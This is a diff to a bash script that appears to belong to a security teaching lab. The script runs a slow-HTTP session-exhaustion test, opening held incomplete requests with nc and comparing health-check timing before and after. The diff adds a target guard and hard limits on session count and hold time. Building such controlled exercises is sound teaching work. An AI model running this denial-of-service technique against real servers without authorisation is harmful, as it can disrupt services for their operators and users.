@@ -4,11 +4,38 @@
 
 set -euo pipefail
 
-TARGET="${TARGET:-app}"
-TARGET_PORT="${TARGET_PORT:-3000}"
+# Resolve the repository copy when run from source and the read-only mounted
+# copy when run in the attack container. No external command runs before the
+# target profile is validated.
+ATTACK_SCRIPT_PATH="${BASH_SOURCE[0]}"
+ATTACK_SCRIPT_DIR="${ATTACK_SCRIPT_PATH%/*}"
+if [[ "$ATTACK_SCRIPT_DIR" == "$ATTACK_SCRIPT_PATH" ]]; then
+    ATTACK_SCRIPT_DIR=.
+fi
+if [[ -r "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh" ]]; then
+    source "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh"
+elif [[ "$ATTACK_SCRIPT_DIR" == "/scripts" && -r "/secure-learn-target-guard.sh" ]]; then
+    source "/secure-learn-target-guard.sh"
+else
+    echo "ERROR: Secure Learn target guard is unavailable." >&2
+    exit 64
+fi
+secure_learn_validate_target
+
 SESSIONS="${SESSIONS:-20}"
 HOLD_SECONDS="${HOLD_SECONDS:-6}"
 OUTPUT_DIR="${OUTPUT_DIR:-/results}"
+
+# These small hard limits keep the observation useful while preventing a typo
+# or hostile environment value from turning a laptop lab into a load generator.
+if [[ ! "$SESSIONS" =~ ^[0-9]+$ || ${#SESSIONS} -gt 2 ]] || ((10#$SESSIONS < 1 || 10#$SESSIONS > 50)); then
+    echo "ERROR: SESSIONS must be a decimal integer from 1 through 50." >&2
+    exit 64
+fi
+if [[ ! "$HOLD_SECONDS" =~ ^[0-9]+$ || ${#HOLD_SECONDS} -gt 2 ]] || ((10#$HOLD_SECONDS < 1 || 10#$HOLD_SECONDS > 15)); then
+    echo "ERROR: HOLD_SECONDS must be a decimal integer from 1 through 15." >&2
+    exit 64
+fi
 
 mkdir -p "$OUTPUT_DIR"
 OUTPUT_FILE="$OUTPUT_DIR/s11_l5_session_stress_$(date +%Y%m%d_%H%M%S).txt"
@@ -20,7 +47,7 @@ open_incomplete_session() {
         printf 'GET / HTTP/1.1\r\n'
         printf 'Host: %s\r\n' "$TARGET"
         sleep "$HOLD_SECONDS"
-    } | nc -w "$((HOLD_SECONDS + 2))" "$TARGET" "$TARGET_PORT" >/dev/null 2>&1 || true
+    } | nc -w "$((10#$HOLD_SECONDS + 2))" "$TARGET_IP" "$TARGET_PORT" >/dev/null 2>&1 || true
 }
 
 {
@@ -34,7 +61,7 @@ open_incomplete_session() {
     echo ""
 
     echo "Phase 1: Baseline health"
-    curl -sS -o /dev/null -w 'HTTP %{http_code}, time %{time_total}s\n' "http://$TARGET:$TARGET_PORT/health" || true
+    curl -sS -H "Host: $TARGET" -o /dev/null -w 'HTTP %{http_code}, time %{time_total}s\n' "http://$TARGET_IP:$TARGET_PORT/health" || true
     echo ""
 
     echo "Phase 2: Opening incomplete sessions"
@@ -49,7 +76,7 @@ open_incomplete_session() {
     echo ""
 
     echo "Phase 3: Health after session pressure"
-    curl -sS -o /dev/null -w 'HTTP %{http_code}, time %{time_total}s\n' "http://$TARGET:$TARGET_PORT/health" || true
+    curl -sS -H "Host: $TARGET" -o /dev/null -w 'HTTP %{http_code}, time %{time_total}s\n' "http://$TARGET_IP:$TARGET_PORT/health" || true
     echo ""
 
     echo "Check detection:"
@@ -59,4 +86,3 @@ open_incomplete_session() {
 
 echo ""
 echo "Results saved to: $OUTPUT_FILE"
-
